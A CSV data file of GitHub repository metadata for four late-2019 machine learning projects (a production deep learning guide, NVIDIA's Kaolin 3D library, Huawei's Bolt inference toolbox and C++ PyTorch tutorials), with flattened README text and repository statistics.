owner,repo,topics,readme,created_at,updated_at,language,owner,owner_type,watchers_count,stargazers_count,forks_count,commits_count,default_branch,contributors,contributors_count,releases_count,tags_count,open_issues_count,closed_issues_count,open_pr_count,closed_pr_count
alirezadir,Production-Level-Deep-Learning,ai#artificial-intelligence#deep-learning#deployment#kubeflow#machine-learning#pipeline#practical-machine-learning#production-system#scalable-applications#tfx,bulb A Guide to Production Level Deep Learning clapper scroll ferry NOTE This repo is still under development and all feedback and contribution are very welcome blush Deploying deep learning models in production can be challenging as it is far beyond training models with good performance Several distinct components need to be designed and developed in order to deploy a production level deep learning system seen below This repo aims to be an engineering guideline for building production level deep learning systems which will be deployed in real world applications The material presented here is borrowed from Full Stack Deep Learning Bootcamp https fullstackdeeplearning com by Pieter Abbeel https people eecs berkeley edu pabbeel at UC Berkeley Josh Tobin http josh tobin com at OpenAI and Sergey Karayev https sergeykarayev com at Turnitin TFX workshop https conferences oreilly com tensorflow tf ca public schedule detail 79327 by Robert Crowe https www linkedin com in robert crowe and Pipeline ai https pipeline ai s Advanced KubeFlow Meetup https www meetup com Advanced KubeFlow by Chris Fregly https www linkedin com in cfregly Machine Learning Projects Fun flushed fact 85 of AI projects fail 1 fsdl Potential reasons include Technically infeasible or poorly scoped Never make the leap to production Unclear success criteria metrics Poor team management 1 ML Projects lifecycle Importance of understanding state of the art in your domain Helps to understand what is possible Helps to know what to try next 2 Mental Model for ML project The two important factors to consider when defining and prioritizing ML projects High Impact Complex parts of your pipeline Where cheap prediction is valuable Where automating complicated manual process is valuable Low Cost Cost is driven by Data availability Performance requirements costs tend to scale super linearly in the accuracy requirement Problem difficulty Some of the hard problems include unsupervised learning reinforcement learning and certain categories of supervised learning Full stack pipeline The following figure represents a high level overview of different components in a production level deep learning system In the following we will go through each module and recommend toolsets and frameworks as well as best practices from practitioners that fit each component 1 Data Management 1 1 Data Sources Supervised deep learning requires a lot of labeled data Labeling own data is costly Here are some resources for data Open source data good to start with but not an advantage Data augmentation a MUST for computer vision an option for NLP Synthetic data almost always worth starting with esp in NLP 1 2 Data Labeling Requires separate software stack labeling platforms temporary labor and QC Sources of labor for labeling Crowdsourcing Mechanical Turk cheap and scalable less reliable needs QC Hiring own annotators less QC needed expensive slow to scale Data labeling service companies FigureEight https www figure eight com Labeling platforms Diffgram https diffgram com Training Data Software Computer Vision Prodigy https prodi gy An annotation tool powered by active learning by developers of Spacy text and image HIVE https thehive ai AI as a Service platform for computer vision Supervisely https supervise ly entire computer vision platform Labelbox https labelbox com computer vision Scale https scale com AI data platform computer vision NLP 1 3 Data Storage Data storage options Object store Store binary data images sound files compressed texts Amazon S3 https aws amazon com s3 Ceph https ceph io Object Store Database Store metadata file paths labels user activity etc Postgres https www postgresql org is the right choice for most of applications with the best in class SQL and great support for unstructured JSON Data Lake to aggregate features which are not obtainable from database e g logs Amazon Redshift https aws amazon com redshift Feature Store store access and share machine learning features Feature extraction could be computationally expensive and nearly impossible to scale hence re using features by different models and teams is a key to high performance ML teams FEAST https github com gojek feast Google cloud Open Source Michelangelo Palette https eng uber com michelangelo Uber Suggestion At training time copy data into a local or networked filesystem NFS 1 fsdl 1 4 Data Versioning It s a MUST for deployed ML models Deployed ML models are part code part data 1 fsdl No data versioning means no model versioning Data versioning platforms DVC https dvc org Open source version control system for ML projects Pachyderm https www pachyderm com version control for data Dolt https www liquidata co versioning for SQL database 1 5 Data Processing Training data for production models may come from different sources including Stored data in db and object stores log processing and outputs of other classifiers There are dependencies between tasks each needs to be kicked off after its dependencies are finished For example training on new log data requires a preprocessing step before training Makefiles are not scalable Workflow manager s become pretty essential in this regard Workflow orchestration Luigi https github com spotify luigi by Spotify Airflow https airflow apache org by Airbnb Dynamic extensible elegant and scalable the most widely used DAG workflow Robust conditional execution retry in case of failure Pusher supports docker images with tensorflow serving Whole workflow in a single py file 2 Development Training and Evaluation 2 1 Software engineering Winner language Python Editors Vim Emacs VS Code https code visualstudio com Recommended by the author Built in git staging and diff Lint code open projects remotely through ssh Notebooks Great as starting point of the projects hard to scale fun fact Netflixs Notebook Driven Architecture is an exception which is entirely based on nteract https nteract io suites nteract https nteract io a next gen React based UI for Jupyter notebooks Papermill https github com nteract papermill is an nteract https nteract io library built for parameterizing executing and analyzing Jupyter Notebooks Commuter https github com nteract commuter another nteract https nteract io project which provides a read only display of notebooks e g from S3 buckets Streamlit https streamlit io interactive data science tool with applets Compute recommendations 1 fsdl For individuals or startups Development a 4x Turing architecture PC Training Evaluation Use the same 4x GPU PC When running many experiments either buy shared servers or use cloud instances For large companies Development Buy a 4x Turing architecture PC per ML scientist or let them use V100 instances Training Evaluation Use cloud instances with proper provisioning and handling of failures Cloud Providers GCP option to connect GPUs to any instance has TPUs AWS 2 2 Resource Management Allocating free resources to programs Resource management options Old school cluster job scheduler e g Slurm https slurm schedmd com workload manager Docker Kubernetes Kubeflow Polyaxon https polyaxon com paid features 2 3 DL Frameworks Unless having a good reason not to use Tensorflow Keras or PyTorch 1 fsdl The following figure shows a comparison between different frameworks on how they stand for developement and production 2 4 Experiment management Development training and evaluation strategy Always start simple Train a small model on a small batch Only if it works scale to larger data and models and hyperparameter tuning Experiment management tools Tensorboard https www tensorflow org tensorboard provides the visualization and tooling needed for ML experimentation Losswise https losswise com Monitoring for ML Comet https www comet ml lets you track code experiments and results on ML projects Weights Biases https www wandb com Record and visualize every detail of your research with easy collaboration MLFlow Tracking https www mlflow org docs latest tracking html tracking for logging parameters code versions metrics and output files as well as visualization of the results Automatic experiment tracking with one line of code in python Side by side comparison of experiments Hyper parameter tuning Supports Kubernetes based jobs 2 5 Hyperparameter Tuning Approaches Grid search Random search Bayesian Optimization HyperBand and ASHA Population based Training Platforms RayTune http tune io Ray Tune is a Python library for hyperparameter tuning at any scale with a focus on deep learning and deep reinforcement learning Supports any machine learning framework including PyTorch XGBoost MXNet and Keras Katib https github com kubeflow katib Kubernete s Native System for Hyperparameter Tuning and Neural Architecture Search inspired by Google vizier https static googleusercontent com media research google com ja pubs archive bcb15507f4b52991a0783013df4222240e942381 pdf and supports multiple ML DL frameworks e g TensorFlow MXNet and PyTorch Hyperas https maxpumperla com hyperas a simple wrapper around hyperopt for Keras with a simple template notation to define hyper parameter ranges to tune SIGOPT https sigopt com a scalable enterprise grade optimization platform Sweeps https docs wandb com library sweeps from Weights Biases https www wandb com Parameters are not explicitly specified by a developer Instead they are approximated and learned by a machine learning model Keras Tuner https github com keras team keras tuner A hyperparameter tuner for Keras specifically for tf keras with TensorFlow 2 0 2 6 Distributed Training Data parallelism Use it when iteration time is too long both tensorflow and PyTorch support Ray Distributed Training https ray readthedocs io en latest distributedtraining html Model parallelism when model does not fit on a single GPU Other solutions Horovod 3 Troubleshooting TBD 4 Testing and Deployment 4 1 Testing and CI CD Machine Learning production software requires a more diverse set of test suites than traditional software Unit and Integration Testing Types of tests Training system tests testing training pipeline Validation tests testing prediction system on validation set Functionality tests testing prediction system on few important examples Continuous Integration Running tests after each new code change pushed to the repo SaaS for continuous integration Argo https argoproj github io Open source Kubernetes native workflow engine for orchestrating parallel jobs incudes workflows events CI and CD CircleCI https circleci com Language Inclusive Support Custom Environments Flexible Resource Allocation used by instacart Lyft and StackShare Travis CI https travis ci org Buildkite https buildkite com Fast and stable builds Open source agent runs on almost any machine and architecture Freedom to use your own tools and services Jenkins Old school build system 4 2 Web Depolyment Consists of a Prediction System and a Serving System Prediction System Process input data make predictions Serving System Web server Serve prediction with scale in mind Use REST API to serve prediction HTTP requests Calls the prediction system to respond Serving options 1 Deploy to VMs scale by adding instances 2 Deploy as containers scale via orchestration Containers Docker Container Orchestration Kubernetes the most popular now MESOS Marathon 3 Deploy code as a serverless function 4 Deploy via a model serving solution Model serving Specialized web deployment for ML models Batches request for GPU inference Frameworks Tensorflow serving MXNet Model server Clipper Berkeley SaaS solutions Seldon https www seldon io serve and scale models built in any framework on Kubernetes Algorithmia https algorithmia com Decision making CPU or GPU CPU inference CPU inference is preferable if it meets the requirements Scale by adding more servers or going serverless GPU inference TF serving or Clipper Adaptive batching is useful Bonus Deploying Jupyter Notebooks Kubeflow Fairing https github com kubeflow fairing is a hybrid deployment package that let s you deploy your Jupyter notebook codes 4 5 Service Mesh and Traffic Routing Transition from monolithic applications towards a distributed microservice architecture could be challenging A Service mesh consisting of a network of microservices reduces the complexity of such deployments and eases the strain on development teams Istio https istio io a service mesh to ease creation of a network of deployed services with load balancing service to service authentication monitoring with few or no code changes in service code 4 4 Monitoring Purpose of monitoring Alerts for downtime errors and distribution shifts Catching service and data regressions Cloud providers solutions are decent Kiali https kiali io an observability console for Istio with service mesh configuration capabilities It answers these questions How are the microservices connected How are they performing Are we done 4 5 Deploying on Embedded and Mobile Devices Main challenge memory footprint and compute constraints Solutions Quantization Reduced model size MobileNets Knowledge Distillation DistillBERT for NLP Embedded and Mobile Frameworks Tensorflow Lite PyTorch Mobile Core ML ML Kit FRITZ OpenVINO Model Conversion Open Neural Network Exchange ONNX open source format for deep learning models 4 6 All in one solutions Tensorflow Extended TFX Michelangelo Uber Google Cloud AI Platform Amazon SageMaker Neptune FLOYD Paperspace Determined AI Domino data lab Tensorflow Extended TFX TBD Airflow and KubeFlow ML Pipelines TBD Other useful links Lessons learned from building practical deep learning systems https www slideshare net xamat lessons learned from building practical deep learning systems Machine Learning The High Interest Credit Card of Technical Debt https ai google research pubs pub43146 Contributing https github com alirezadir Production Level Deep Learning blob master CONTRIBUTING md References 1 Full Stack Deep Learning Bootcamp https fullstackdeeplearning com Nov 2019 2 Advanced KubeFlow Workshop https www meetup com Advanced KubeFlow by Pipeline ai https pipeline ai 2019 3 TFX Real World Machine Learning in Production https cdn oreillystatic com en assets 1 event 298 TFX 20Production 20ML 20pipelines 20with 20TensorFlow 20Presentation pdf,2019-11-19T20:11:21Z,2019-12-15T00:36:51Z,n/a,alirezadir,User,77,1650,194,46,master,alirezadir#swirlingsand#heytitle#richardliaw#soham96#compSciKai,6,0,0,4,2,3,5
NVIDIAGameWorks,kaolin,3d-deep-learning#artificial-intelligence#differentiable-rendering#model-zoo#neural-networks#pytorch,Kaolin A PyTorch Library for Accelerating 3D Deep Learning Research Documentation https kaolin readthedocs io en latest Paper https arxiv org abs 1911 05063 Kaolin is a PyTorch library aiming to accelerate 3D deep learning research Kaolin provides efficient implementations of differentiable 3D modules for use in deep learning systems With functionality to load and preprocess several popular 3D datasets and native functions to manipulate meshes pointclouds signed distance functions and voxel grids Kaolin mitigates the need to write wasteful boilerplate code Kaolin packages together several differentiable graphics modules including rendering lighting shading and view warping Kaolin also supports an array of loss functions and evaluation metrics for seamless evaluation and provides visualization functionality to render the 3D results Importantly we curate a comprehensive model zoo comprising many state of the art 3D deep learning architectures to serve as a starting point for future research endeavours Fun fact The name Kaolin its from Kaolinite a form of plasticine clay that is sometimes used in 3D modeling Table of Contents Functionality functionality Installation And Usage installation and usage Supported Platforms supported platforms Install Kaolin install kaolin Verify Installation verify installation Building the Documentation building the documentation Running Unittests running unittests Main Modules main modules Getting Started getting started Acknowledgements acknowledgements License license Functionality Currently the beta release contains several processing functions for 3D deep learning on meshes voxels signed distance functions and pointclouds Loading of several popular datasets eg ShapeNet ModelNet SHREC are supported out of the box We also implement several 3D conversion and transformation operations both within and across the aforementioned representations Kaolin supports several 3D tasks such as Differentiable rendering see Neural Mesh Renderer https github com hiroharu kato neuralrenderer its PyTorch port https github com daniilidis group neuralrenderer Soft Rasterizer https github com ShichenLiu SoftRas Differentiable Interpolation based Renderer https nv tlabs github io DIB R and a modular and extensible abstract DifferentiableRenderer specification Single image based mesh reconstruction Pixel2Mesh https github com nywang16 Pixel2Mesh GEOMetrics https github com EdwardSmith1884 GEOMetrics OccupancyNets https github com autonomousvision occupancynetworks and more Pointcloud classification and segmentation PointNet https github com fxia22 pointnet pytorch PoinNet https github com erikwijmans Pointnet2PyTorch DGCNN https github com muhanzhang pytorchDGCNN Mesh classification and segmentation MeshCNN https github com ranahanocka MeshCNN GCN https github com tkipf pygcn 3D superresolution on voxel grids ODM https github com EdwardSmith1884 Multi View Silhouette and Depth Decomposition for High Resolution 3D Object Representation VoxelUNet and more Basic graphics utilities lighting shading etc Model Zoo Kaolin curates a large model zoo containing reference implementations of popular 3D DL architectures Head over here kaolin models to check them out NOTE For several of these models the implementation is due to the original authors We build a bridge to our library and wherever possible we introduce optimization If you use any of the models in the model zoo or the graphics packages eg differentiable renderers such as NMR https arxiv org abs 1711 07566 SoftRas https arxiv org abs 1904 01786 DIB R https arxiv org abs 1908 01210 please cite the original papers in addition to Kaolin For convenience BibTeX citation formats for each of the original papers are included in the documentation for each model provided Installation and Usage NOTE The API is currently somewhat unstable as we re making constant changes It s a beta release Requirements Linux Python 3 6 CUDA 10 0 130 with nvcc installed Display Driver 410 48 Windows support is in the works and is currently considered experimental Dependencies numpy 1 17 PyTorch 1 2 and Torchvision see pytorch org http pytorch org for installation instructions Installation We highly recommend installing Kaolin inside of a virtual environment such as ones created using conda or virtualenv In this example we show how to create a conda virtual environment for installing kaolin sh conda create name kaolin python 3 6 conda activate kaolin Dependencies Install PyTorch and Torchvision by following instructions from https pytorch org Numpy will be installed as part of the Pytorch installation Note that the setup file does not automatically install these dependencies Install Kaolin Now you can install the library From the root directory of this repo i e the directory containing this README file run For General Use sh python setup py buildext inplace optional allows importing kaolin from the kaolin root directory python setup py install For Development modifying kaolin code sh python setup py develop Note if modifying or adding Cython files ensure that Cython is installed and set the following environment variable USECYTHON 1 During installation the packman package manager will download the nv usd package to packman repo containing the necessary packages for reading and writing Universal Scene Description USD files Verify installation To verify that kaolin has been installed fire up your python interpreter and execute the following commands python import kaolin as kal print kal version Building the Documentation To delve deeper into the library build the documentation From the root directory of the repository i e the directory containing this README file execute the following bash cd docs sphinx build build Running Unittests To run unittests from the root directory of the repository i e the directory containing this README file execute the following commands bash pytest tests Main Modules rep Supported 3D asset representations include Triangle Meshes Quad Meshes Voxel Grids Point Clouds Signed Distance Functions SDF conversions Supports conversion across all popular 3D representations models Provided models include the following For each implementation we also provide a link to the original implementation which it was ported from DGCNN Paper https arxiv org abs 1801 07829v1 Original implementation https github com WangYueFt dgcnn DIB R Paper https arxiv org abs 1908 01210 Original implementation https github com nv tlabs DIB R GEOMetrics Paper https arxiv org abs 1901 11461 Original implementation https github com EdwardSmith1884 GEOMetrics Image2Mesh Paper https arxiv org abs 1711 10669 Original implementation https github com jhonykaesemodel image2mesh Occupancy Network Paper https arxiv org abs 1812 03828 Original implementation https github com autonomousvision occupancynetworks Pixel2Mesh Paper https arxiv org abs 1804 01654 Original implementation TensorFlow https github com nywang16 Pixel2Mesh Re implementation that we borrow from https github com EdwardSmith1884 GEOMetrics PointNet Paper https arxiv org abs 1612 00593 Original implementation https github com charlesq34 pointnet Re implementation we borrow from here https github com fxia22 pointnet pytorch PointNet Paper https arxiv org abs 1706 02413 Original implementation we borrow from here https github com charlesq34 pointnet2 Re implementation we borrow from here https github com erikwijmans Pointnet2PyTorch MeshEncoder A simple mesh encoder architecture GraphResNet MeshEncoder with residual connections OccupancyNetworks Paper https arxiv org abs 1812 03828 Original implementation https github com autonomousvision occupancynetworks MeshCNN Paper https arxiv org abs 1809 05910 Original implementation https github com ranahanocka MeshCNN VoxelGAN Paper http 3dgan csail mit edu papers 3dgannips pdf Original implementation https github com zck119 3dgan release AtlasNet Paper https arxiv org abs 1802 05384 Original implementation https github com ThibaultGROUEIX AtlasNet And many more to come NOTE For several of these models the implementation is due to the original authors We build a bridge to our library and wherever possible we introduce optimization If you use any of the models in the model zoo or the graphics packages eg differentiable renderers such as NMR https arxiv org abs 1711 07566 SoftRas https arxiv org abs 1904 01786 DIB R https arxiv org abs 1908 01210 please cite the original papers in addition to Kaolin For convenience BibTeX citation formats for each of the original papers are included in the documentation for each model provided graphics Kaolin provides a flexible and modular framework for building differentiable renderers making it simple to replace individual components with new ones Kaolin also provides implementations of the following differentiable renderers DIB R Paper https arxiv org abs 1908 01210 Original implementation we borrow from here https github com nv tlabs DIB R SoftRas Paper https arxiv org abs 1904 01786 Original implementation we borrow from here https github com ShichenLiu SoftRas Neural 3D Mesh Renderer Paper https arxiv org abs 1711 07566 Original Chainer implementation https github com hiroharu kato neuralrenderer PyTorch re implementation we borrow from here https github com daniilidis group neuralrenderer metrics Implemented metrics and loss functions Mesh Triangle Distance Chamfer Distance Edge Length regularization Laplacian regularization Point to Surface distance Normal consistency Point Cloud Sided Distance Chamfer Distance Directed Distance Voxel Grid Intersection Over Union 3D IoU F Score Getting Started Take a look at some of our examples Examples include differentiable renderers voxel superresolution etc Begin here examples Note We will very soon host our docs online Stay tuned for the link Until then please follow instructions from above building the documentation to build docs Contributors Krishna Murthy Jatavallabhula https krrish94 github io Edward Smith https github com EdwardSmith1884 Jean Francois Lafleche https www linkedin com in jflafleche Clement Fuji Tsang https ca linkedin com in clement fuji tsang b8028a82 Artem Rozantsev https sites google com site artemrozantsev Wenzheng Chen http www cs toronto edu wenzheng Tommy Xiang https github com TommyX12 Rev Lebaredian https blogs nvidia com blog author revlebaredian Gavriel State https ca linkedin com in gavstate Sanja Fidler https www cs utoronto ca fidler Acknowledgements Acknowledgements Acknowledgements txt We would like to thank Amlan Kar https amlankar github io for suggesting the need for this library We also thank Ankur Handa http ankurhanda github io for his advice during the initial and final stages of the project Many thanks to Joanh Philion https scholar google com citations user VVIAoY0AAAAJ hl en Daiqing Li https www linkedin com in daiqing li 23873789 originalSubdomain ca Mark Brophy https ca linkedin com in mark brophy 3a298382 Jun Gao http www cs toronto edu jungao and Huan Ling http www cs toronto edu linghuan who performed detailed internal reviews and provided constructive comments We also thank Gavriel State https ca linkedin com in gavstate for all his help during the project Most importantly we thank all 3D DL researchers who have made their code available as open source The field could use a lot more of it License and Copyright LICENSE LICENSE COPYRIGHT COPYRIGHT If you find this library useful consider citing the following paper articlekaolin2019arxiv author J Krishna Murthy and Smith Edward and Lafleche Jean Francois and Fuji Tsang Clement and Rozantsev Artem and Chen Wenzheng and Xiang Tommy and Lebaredian Rev and Fidler Sanja title Kaolin A PyTorch Library for Accelerating 3D Deep Learning Research journal arXiv 1911 05063 year 2019 Contributors for borrowed sources Here is a list of all authors on relevant research papers that Kaolin borrows code from Without the efforts of these folks and their willingness to release their implementations under permissive open source licenses Kaolin would not have been possible Kornia Edgar Riba Dmytro Mishkin Daniel Ponsa Ethan Rublee and Gary Bradski Paper https arxiv org pdf 1910 02190 pdf Code https github com kornia kornia Occupancy Networks Lars Mescheder Michael Oechsle Michael Niemeyer Sebastian Nowozin Andreas Geiger Paper https avg is tuebingen mpg de publications occupancy networks Code https github com autonomousvision occupancynetworks Multi View Silhouette and Depth Decomposition for High Resolution 3D Object Representation Edward Smith Scott Fujimoto David Meger Paper https papers nips cc paper 7883 multi view silhouette and depth decomposition for high resolution 3d object representation pdf Code https github com EdwardSmith1884 Multi View Silhouette and Depth Decomposition for High Resolution 3D Object Representation Pytorch Chamfer Distance Christian Diller Code https github com chrdiller pyTorchChamferDistance GEOMetrics Edward Smith Scott Fujimoto Adriana Romero David Meger Paper https arxiv org abs 1901 11461 Code https github com EdwardSmith1884 GEOMetrics DeepSDF Jeong Joon Park Peter Florence Julian Straub Richard Newcombe Steven Lovegrove Paper http openaccess thecvf com contentCVPR2019 html ParkDeepSDFLearningContinuousSignedDistanceFunctionsforShapeRepresentationCVPR2019paper html Code https github com facebookresearch DeepSDF PointGAN Fei Xia Code https github com fxia22 pointGAN AtlasNet Thibault Groueix Matthew Fisher Vladimir G Kim Bryan C Russell Mathieu Aubry Paper https arxiv org abs 1802 05384 Code https github com ThibaultGROUEIX AtlasNet PointNet Charles R Qi Hao Su Kaichun Mo Leonidas J Guibas Also Fei Xia reimplementation Paper https arxiv org abs 1612 00593 Code https github com fxia22 pointnet pytorch MeshCNN Rana Hanocka Amir Hertz Noa Fish Raja Giryes Shachar Fleishman Daniel Cohen Or Paper https arxiv org abs 1809 05910 Code https github com ranahanocka MeshCNN DGCNN Muhan Zhang Zhicheng Cui Marion Neumann Yixin Chen Paper https www cse wustl edu muhan papers AAAI2018DGCNN pdf Code https github com muhanzhang pytorchDGCNN Neural 3D Mesh Renderer Hiroharu Kato Yoshitaka Ushiku Tatsuya Harada Also Nikos Kolotouros for reimplementation Paper https arxiv org abs 1711 07566 Code https github com daniilidis group neuralrenderer SoftRasterizer Shichen Liu Tianye Li Weikai Chen Hao Li Paper https arxiv org abs 1904 01786 Code https github com ShichenLiu SoftRas DIB R Wenzheng Chen Jun Gao Huan Ling Edward J Smith Jaakko Lehtinen Alec Jacobson Sanja Fidler Paper https arxiv org abs 1908 01210 Code https github com nv tlabs DIB R PointNet Charles R Qi Li Eric Yi Hao Su Leonidas J Guibas Also Erik Wijmans reimplementation Paper https arxiv org abs 1706 02413 Code https github com erikwijmans Pointnet2PyTorch Learning a Probabilistic Latent Space of Object Shapes via 3D Generative Adversarial Modeling Jiajun Wu Chengkai Zhang Tianfan Xue William T Freeman Joshua B Tenenbaum Paper http arxiv org abs 1610 07584 Code ht,2019-11-14T21:09:40Z,2019-12-14T17:17:01Z,C++,NVIDIAGameWorks,Organization,72,1342,131,72,master,Jean-Francois-Lafleche#Caenorst#krrish94#TommyX12#edgarriba,5,0,0,51,23,10,25
huawei-noah,bolt,n/a,Bolt 1 Introduction Bolt is a light weight inference toolbox for mobile devices Bolt as a universal deployment tool for all kinds of neural networks aims to minimize the inference runtime as much as possible Higher speed better security and more efficient memory management are the advantages that Bolt strives to provide 2 Features 2 1 Supported Deep Learning Platform caffe onnx tflite pytorch via onnx tensorflow via onnx 2 2 Supported Operators Attention BatchNorm Clip Concat Convolution Eltwise Embedding FullyConnected Gelu HSigmoid HSwish LayerNorm LSTM MatMul Multiply Pad Pooling Relu Relu6 Reshape Scale Sigmoid Slice Softmax TanH Transpose 2 3 Supported Inference Precision Types fp16 int8 binary 2 4 Verified Networks Bolt supports common neural networks such as Sequential CNN LSTM etc Verified CV models include squeezenet https github com forresti SqueezeNet resnet50 https github com KaimingHe deep residual networks models mobilenetv1 https github com shicai MobileNet Caffe mobilenetv2 https github com shicai MobileNet Caffe mobilenetv3 https github com jixing0415 caffe mobilenet v3 birealnet18 https github com JDAI CV dabnn etc Verified NLP models include lstm bert https github com google research bert tinybert albert https github com google research google research tree master albert etc 3 Compilation and Installation Before compilation you need to install some dependencies and set environment variables accordingly Two ways of compilation are provided For direct compilation you can compile Bolt on arm devices directly binding the dependent libraries as dynamic libraries For cross compilation you can compile Bolt on x86 devices binding the dependent libraries as static libraries More compilation details please refer to INSTALL md https github com huawei noah bolt blob master INSTALL md 4 User Guide The typical use case of Bolt can be summarized into the following 3 steps 1 Compile Bolt Two sets of executables shall be generated The first set is for model converting such as caffe2bolt onnx2bolt tflite2bolt etc The other set is for the inference tasks such as classification bert etc The following steps use caffe2bolt and classification as example 2 Use caffe2bolt to convert Caffe model demo prototxt demo caffemodel to Bolt format demo bolt 3 Run classification with the Bolt model and target inputs More details can be found below in Section 4 2 4 1 How to implement a sequential model Sequential model is a linear model You can self define a personalized model and deploy it on Bolt Here we take Lenet as a simple example c int main int argc char argv char imageDir char if argc 2 printhelp argv else imageDir argv 1 const Arch A ARMA76 DataType dt DTF16 auto model Sequential dt lenet auto op Factory createConvolution dt 8 5 1 2 ACTIVATIONNULL ACTIVATIONNULL ConvolutionPointwise 1 1 model add op op Factory createPooling PoolingMode Max 2 2 0 RoundMode CEIL model add op op Factory createConvolution dt 8 3 1 1 ACTIVATIONNULL ACTIVATIONNULL ConvolutionPointwise 1 1 model add op op Factory createPooling PoolingMode Max 2 2 0 RoundMode CEIL model add op op Factory createFullyConnectedEltwise dt 10 model add op op Factory createSoftmax dt model add op TensorDesc imageDesc tensor4df DTF16 DFNCHW 1 1 8 8 auto weight F16 operator new 256 256 256 sizeof F16 for int i 0 i 256 256 256 i weight i 1 U8 wPtr U8 weight std sharedptr modelPtr wPtr model ready imageDesc modelPtr load images Vec images loadimages imageDir imageDesc images BGR 1 0 for auto image images Vec input input pushback image model setinputtensors input model run auto outputs model getoutputtensors outputs 0 print return 0 You may also refer to engine tests lenet cpp for details When you compile the source code of Bolt the lenet application will also be generated engine bin lenet 4 2 How to convert and deploy a CNN model You can also load a trained cnn model and deploy it on bolt c int main int argc char argv pass the file parameter upon on personalized situation const Arch A NEON ModelSpec ms deserializemodelfromfile modelpath ms auto cnn createCNN ms load images Vec images HashMap inmap cnn getinputs TensorDesc imagedesc inmap begin second getdesc Vec iamgepaths loadimages imagedir imagedesc image scalevalue for auto image images set input Vec input input pushback image cnn setinputtensors input run cnn run get result HashMap outmap cnn getoutputs Tensor result outmap begin second return 0 As mentioned above you can get the classification results in 3 steps Compile Bolt and get model tools bin caffe2bolt and engine bin classification Secondly you should convert the Caffe model like this caffe2bolt modelstoragepath modelname caffe2bolt takes at least two arguments One is the storage path of the Caffe model files The other is the model name and caffe2bolt will look for modelname prototxt and modelname caffemodel in the specified directory Thirdly set the Bolt model and the images as the inputs to classification and run it like this classification boltmodelpath inputdatadirectorypath imagestyle scalevalue TOPK correctlabel classification takes 6 arguments In addition to the paths for the Bolt model and the image folder you can select the preprocessing style required by the model For example you should set imagestyle to BGR for Caffe models and set scalevalue to 1 for resnet50 and 0 017 for mobilenets If you want to get TOP5 accuracy please set TOPK to 5 Lastly please specify the correct label number for the input image folder 5 Benchmark 5 1 Accuracy modelacc top1 official top1 bolt top5 official top5 bolt resnet50 75 30 75 60 92 20 95 51 mobilenetv1 70 81 70 13 89 85 92 23 squeezenet 57 50 61 61 80 30 87 69 Birealnet18 BNN 56 40 54 95 79 50 81 61 5 2 speed Here we list the single thread execution time measured on Kirin 810 modelspeed fp16 on A55 fp16 on A76 int8 on A55 int8 on A76 resnet50 393 89 ms 95 86 ms 289 95 ms mobilenetv1 70 38 ms 19 85 ms mobilenetv2 69 4 ms 18 27 ms squeezenet 46 97 ms 12 16 ms 40 15 ms 12 15 ms bert 5359 9 ms 1520 26 ms tinybert 45 63 ms 12 25 ms alberttiny 143 ms 39 ms albert 1972 ms 488 ms modelspeed BNN on A55 BNN on A76 Birealnet18 77 66 ms 30 70 ms Experimental support without mature optimization 6 Developer Guide Everyone can self define new operators in Bolt We welcome the community to contribute functionalities in tensorcomputing engine and model tools to make Bolt more and more versatile For more details you can refer to DEVELOPER md https github com huawei noah bolt blob master DEVELOPER md We appreciate your contributions Anyone who has contributed to Bolt will be recorded into the CONTRIBUTORS md https github com huawei noah bolt blob master CONTRIBUTORS md 7 FAQ 1 Q What are the dependent libraries A The two major dependencies are Protobuf and CImg Please refer to model tools dependency and image dependency for more details 2 Q Requirements on tensor dimensions A For optimal performance Bolt requires the number of output channels to be divisible by 8 3 Q Restrictions for BNN A For BNN layers the number of output channels must be divisible by 32 4 Q Restrictions on convolution and pooling A Currently Bolt requires that the kernelsize stride padding should be the same in height and width dimension 5 Q Restrictions on quantization int8 A For the time being Bolt only supports post training int8 quantization If quantization is activated the second convolution layer will quantize the tensors to 8 bit integers For now int8 operators include Convolution Pooling and Concatenation end to end support for Squeezenet If your network includes other operators you may need to add type casting in the front of those operators The quantization method is symmetrical for both activation and weight 8 Acknowledgement Bolt refers to the following projects caffe https github com BVLC caffe onnx https github com onnx onnx protobuf https github com protocolbuffers protobuf flatbuffers https github com google flatbuffers ncnn https github com Tencent ncnn mnn https github com alibaba MNN dabnn https github com JDAI CV dabnn QQ Technology Group 833345709 License The MIT License MIT,2019-12-02T12:06:12Z,2019-12-15T01:41:11Z,C++,huawei-noah,Organization,21,210,41,20,master,jianfeifeng#songqun#nihui,3,0,0,3,4,0,2
prabhuomkar,pytorch-cpp,artificial-intelligence#autograd#convolutional-neural-network#cplusplus#generative-adversarial-network#language-model#libtorch#machine-learning#neural-network#pytorch#recurrent-neural-network#tensors#torch#tutorial,Build Status https travis ci org prabhuomkar pytorch cpp svg branch master https travis ci org prabhuomkar pytorch cpp MIT License https img shields io github license prabhuomkar pytorch cpp C PyTorch https img shields io badge c 2B 2B pytorch orange This repository provides tutorial code in C for deep learning researchers to learn PyTorch Python Tutorial https github com yunjey pytorch tutorial https github com yunjey pytorch tutorial Getting Started Fork Clone and Install bash git clone https github com prabhuomkar pytorch cpp git chmod x scripts sh scripts sh install optional cuda 9 2 or 10 1 to install libtorch cuda versions by default cpu version is installed Download all datasets used in the tutorials bash scripts sh downloaddatasets Build bash scripts sh build Table of Contents 1 Basics PyTorch Basics tutorials basics pytorchbasics main cpp Linear Regression tutorials basics linearregression main cpp Logistic Regression tutorials basics logisticregression main cpp Feedforward Neural Network tutorials basics feedforwardneuralnetwork src main cpp 2 Intermediate Convolutional Neural Network tutorials intermediate convolutionalneuralnetwork src main cpp Deep Residual Network tutorials intermediate deepresidualnetwork src main cpp Recurrent Neural Network tutorials intermediate recurrentneuralnetwork src main cpp Bidirectional Recurrent Neural Network tutorials intermediate bidirectionalrecurrentneuralnetwork src main cpp Language Model RNN LM tutorials intermediate languagemodel src main cpp 3 Advanced Generative Adversarial Networks tutorials advanced generativeadversarialnetwork main cpp Variational Auto Encoder tutorials advanced variationalautoencoder src main cpp Neural Style Transfer Image Captioning CNN RNN Dependencies C PyTorch C API Authors Omkar Prabhu prabhuomkar https github com prabhuomkar Markus Fleischhacker mfl28 https github com mfl28,2019-11-05T16:52:01Z,2019-12-15T00:57:21Z,C++,prabhuomkar,User,22,192,25,54,master,prabhuomkar#mfl28,2,0,0,2,10,0,13
